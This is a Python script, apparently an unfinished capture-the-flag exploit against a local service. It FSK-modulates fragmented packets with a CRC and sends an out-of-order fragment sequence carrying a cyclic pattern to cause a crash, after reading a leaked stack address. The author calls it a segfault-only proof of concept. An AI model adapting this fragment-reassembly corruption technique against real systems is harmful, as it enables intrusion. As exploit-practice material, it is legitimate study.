from pwnlib import *


"""

NOTE: This exploit isn't finished, it just gets a segfault as a PoC; the rest
should not be too hard, but it's not something I need to practice.


"""


#########

import itertools
import math

MARK_HZ = 1200.0
SPACE_HZ = 2200.0
FRAME_RATE = 13200.0 # samples per second
BAUD_RATE = 13200.0
TWO_PI = 2.0 * math.pi

def _modulate(data):
	seconds_per_sample = 1.0 / FRAME_RATE
	phase = 0

	for bit in data:
		freq = MARK_HZ if bit else SPACE_HZ
		phase_change = TWO_PI * freq * seconds_per_sample

		assert phase <= TWO_PI
		yield math.sin(phase)
		
		phase += phase_change
		if phase > TWO_PI:
			phase -= TWO_PI

def duplicate(data):
	for x in data:
		for _ in range(40): # 40 seems to work well
			yield x

def modulate(data):
	for x in _modulate(duplicate(data)):
		yield int(math.floor(x*128 + 128))

def not32(integer):
	return ((0 - integer) - 1) % (1<<32)

def crc(data):
	ecx = 0xffff
	i = 0
	for i in range(len(data)):
		edx = ord(data[i])
		for eax in range(8, 0, -1):
			if ((ecx ^ edx) & 1) == 1:
				ecx = (ecx >> 1) ^ 0x8408
			else:
				ecx = ecx >> 1
			edx = edx >> 1
	ecx = not32(ecx)
	ecx = ((ecx & 0xff00) >> 8) | (ecx << 8) % (1<<32)

	return struct.pack(">H", (ecx & 0xffff))

def i2bits(i):
	assert i >= 0
	assert i <= 255
	res = [int(j) for j in bin(i)[2:]]
	while (len(res) % 8) != 0:
		res = [0] + res
	assert len(res) == 8 
	return res

def s2bits(s):
	return [x for byte in s for x in i2bits(ord(byte))]

def packet(data, flags):
	bits  = []

	# warm up filter
	bits += [1]*10  + [0]

	# help the receiver with clock synchronization
	bits += [0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 
			 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0]

	# send magic bit pattern
	bits += [1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0]

	bits += flags
	bits += i2bits(len(data))
	bits += s2bits(data)
	bits += s2bits(crc(data))
	assert len(s2bits(data)) == len(data)*8
	print s2bits(data)

	bits += [0]
	
	return "".join(chr(x) for x in modulate(bits))

def frag(data, last_frag, seq_num, frag_num):
	flags = [1, 1, 1, 1, 1, 0, 0, 1] if last_frag else [1, 0, 0, 1, 1, 0, 0,1]
	seq_ctl = struct.pack("<H", (seq_num << 4) | frag_num)
	return packet(seq_ctl + data, flags)



payload = pattern(48)

samples  = ""
samples += frag("AAA0", False, 0xaaa, 0)
samples += frag("BBB0", False, 0xbbb, 0)
samples += frag("DDD0", False, 0xddd, 0)
samples += frag(payload, False, 0xccc, 1)
samples += frag("AAA1", True, 0xaaa, 1)
samples += frag("C"*36, True, 0xccc, 0)
samples += frag("BBB1", True, 0xbbb, 0)




s = Socket(("localhost", 6767))

s.send("!\n")
s.recv_until("Logging on!\n")
s.recv_until("[DBG][INFO]::")
stack = int(s.recv_until(" sample buffer\n"), 16)

s.send(pd(len(samples)) + samples)
s.interact()
